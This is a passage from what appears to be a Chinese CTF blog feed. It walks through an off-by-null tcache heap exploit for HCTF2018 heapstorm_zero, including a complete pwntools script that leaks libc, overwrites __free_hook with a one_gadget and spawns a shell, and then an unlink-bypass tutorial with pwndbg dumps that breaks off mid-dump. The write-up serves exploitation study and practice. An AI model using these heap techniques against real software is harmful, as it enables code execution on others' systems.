首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span 